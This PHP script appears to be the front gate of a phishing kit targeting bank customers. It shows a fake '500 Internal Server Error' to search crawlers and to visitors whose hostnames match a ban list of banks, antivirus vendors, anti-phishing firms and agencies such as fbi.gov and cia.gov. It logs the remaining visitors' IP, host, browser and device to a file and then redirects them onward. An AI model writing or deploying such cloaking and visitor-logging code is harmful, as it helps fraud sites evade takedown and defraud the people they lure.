<?php
require __DIR__ . '/functions/conn.php';

$_SESSION['sistema'] = getSystem();

//erro 500
$e500 = '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head>
<title>500 Internal Server Errorr</title></head><body>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error or
misconfiguration and was unable to complete
your request.</p>
<p>Please contact the server administrator,
administrator and inform them of the time the error occurred,
and anything you might have done that may have
caused the error.</p>
<p>More information about this error may be available
in the server error log.</p><hr><address></address></body></html>';

$data = date("d-M-Y");
$ip = $_SERVER['REMOTE_ADDR'];
$host = gethostbyaddr($ip);
$Hora_Servidor = "+0";
$acerto = time() + ($Hora_Servidor * 60 * 60);
$hora = date("H:i:s", $acerto);

$blockedUserAgents = [
    "webfilter",
    "feedfetcher",
];

if (!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = ["Google", "GoogleBot", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler"];
    if (preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        echo $e500;
        exit;
    }
}

function validAgent()
{
    global $blockedUserAgents;
    foreach ($blockedUserAgents as $userAgent) {
        if (strpos($_SERVER['HTTP_USER_AGENT'], $userAgent) !== false) {
            return true;
        }
    }

    return false;
}

$MSIE = strpos($_SERVER['HTTP_USER_AGENT'], "MSIE");
$Firefox = strpos($_SERVER['HTTP_USER_AGENT'], "Firefox");
$Mozilla = strpos($_SERVER['HTTP_USER_AGENT'], "Mozilla");
$Chrome = strpos($_SERVER['HTTP_USER_AGENT'], "Chrome");
$Chromium = strpos($_SERVER['HTTP_USER_AGENT'], "Chromium");
$Safari = strpos($_SERVER['HTTP_USER_AGENT'], "Safari");
$Opera = strpos($_SERVER['HTTP_USER_AGENT'], "Opera");

if ($MSIE == true) {
    $navegador = "IE";
} else if ($Firefox == true) {
    $navegador = "Firefox";
} else if ($Mozilla == true) {
    $navegador = "Firefox";
} else if ($Chrome == true) {
    $navegador = "Chrome";
} else if ($Chromium == true) {
    $navegador = "Chromium";
} else if ($Safari == true) {
    $navegador = "Safari";
} else if ($Opera == true) {
    $navegador = "Opera";
} else {
    $navegador = $_SERVER['HTTP_USER_AGENT'];
}

$_SESSION['navegador'] = $navegador;

$useragent = $_SERVER['HTTP_USER_AGENT'];
if (preg_match('/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows (ce|phone)|xda|xiino/i', $useragent) || preg_match('/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i', substr($useragent, 0, 4))) {
    $plataforma = "MOBILE";
} else {
    $plataforma = "PC";
}

$registos = "../reg.txt";
$linhas = @count(file($registos));

ignore_user_abort(false);
$email = '';

if (!file_exists($registos))
    $fp = @fopen($registos, "w+");
else
    $fp = @fopen($registos, "a");
@flock($fp, LOCK_EX);
@fwrite($fp, "$data**$hora**$plataforma**$email**" . $ip . " (" . $host . ")**" . $navegador . "**" . $siglapais . "\n");
@flock($fp, LOCK_UN);
@fclose($fp);

ignore_user_abort(true);

$uri = $_SERVER["REQUEST_URI"];
$ipserver = $_SERVER["SERVER_ADDR"];
$resuelveserver = gethostbyaddr($ipserver);

$ipx = getenv("REMOTE_ADDR");
$host = gethostbyaddr($ipx);
$banhosts = [
    "186.231.96.130", "186-231-96-130.livetim.timbrasil.com.br", "bradesco", "pish", "santander",
    "scotiabank", "google-bot", "netcraft.com", "ebay.com", "panda.com", "microsoft.com",
    "fbi.gov", "google.com", "msn.com", "yahoo.com", "cia.gov", "$resuelveserver", "bankofamerica", "viabcp", "veritas",
    "nod32", "antipishing", "kapersky", "norton", "symantec", "rsasecurity", "bancopopular", "paypal", "unicaja", "cloudentel",
    "banesto", "cajamadrid", "bancopastor", "rsa.com", "symantecstore", "gfihispana", "fraudwatchinternational", "verisign",
    "markmonitor", "anti-phishing", "pandasoftware", "delitosinformaticos", "zonealarm", "alerta-antivirus", "vsantivirus",
    "nortonsecurityscan", "hauri-la", "cleandir", "trendmicro", "mcafee", "nod32-es", "pandaantivirus", "free-av", "grisoft",
    "bitdefender-es", "sophos", "activescan", "avast", "bitdefender", "trendmicro-europe", "clamav", "clamwin", "eset",
    "symantecstore", "f-secure", "hispasec", "vnunet", "seguridad", "security", "monitor", "detector", "letti", "itau",
    "santander", "dufrio", "mx.", "bradesco", "bb.com.br", "uptimerobot.com",
];

$x = count($banhosts);

for ($y = 0; $y < $x; $y++) {
    if (strpos($host, $banhosts[$y]) == true) {
        echo $e500;
        exit;
    }
}

$link = getQuery($mainFile);
header("Location: {$link}");
exit;
